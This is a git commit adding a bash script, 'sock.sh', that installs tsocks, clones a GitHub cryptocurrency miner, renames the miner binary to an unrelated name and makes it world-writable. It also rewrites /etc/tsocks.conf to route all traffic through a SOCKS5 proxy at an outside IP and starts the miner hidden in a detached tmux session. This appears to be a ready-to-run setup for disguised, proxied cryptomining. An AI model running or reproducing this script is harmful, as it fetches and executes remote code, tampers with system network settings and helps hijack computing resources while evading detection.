166c5196b79b45fa0fc992e16c83ea8b9899d459
tonhue26 <38829206+tonhue26@users.noreply.github.com>
2018-05-07 09:05:17 +0700

    Create sock.sh

---
+++ sock.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install cpulimit -y && sudo apt-get install tsocks
+git clone https://github.com/tonhue26/ariocppminer.git
+cd ariocppminer
+mv ariocppminer_avx2 dongqn
+chmod 0777 dongqn
+sed -i 's/192.168.0.0/0.0.0.0/g' /etc/tsocks.conf
+sed -i 's/255.255.255.0/0.0.0.0/g' /etc/tsocks.conf
+sed -i 's/192.168.0.1/38.141.47.57/g' /etc/tsocks.conf
+sed -i 's/server_port = 1080/server_port = 1221/g' /etc/tsocks.conf
+sed -i 's/server_type = 4/server_type = 5/g' /etc/tsocks.conf
+tsocks tmux new-session -d -s my_session1 './dongqn'
